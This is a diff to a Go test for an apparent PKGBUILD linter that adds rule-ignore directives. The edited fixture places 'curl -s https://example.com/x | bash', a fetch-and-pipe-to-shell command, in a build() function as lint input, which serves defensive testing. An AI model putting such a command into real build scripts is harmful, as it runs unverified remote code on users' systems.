@@ -247,10 +247,10 @@ build() {
 	t.Run("extends a directive already covering the site", func(t *testing.T) {
 		got := addIgnoresAll(t, map[string]string{"PKGBUILD": pkgbuildWith("", `
 build() {
-  # pkglint: ignore=PB204
-  go build -o demo . && cargo build --release
+  # pkglint: ignore=PB201
+  curl -s https://example.com/x | bash
 }`)})["PKGBUILD"]
-		mustContain(t, got, "# pkglint: ignore=PB204,PB203\n")
+		mustContain(t, got, "# pkglint: ignore=PB201,PB304\n")
 	})
 
 	t.Run("annotated package lints clean", func(t *testing.T) {
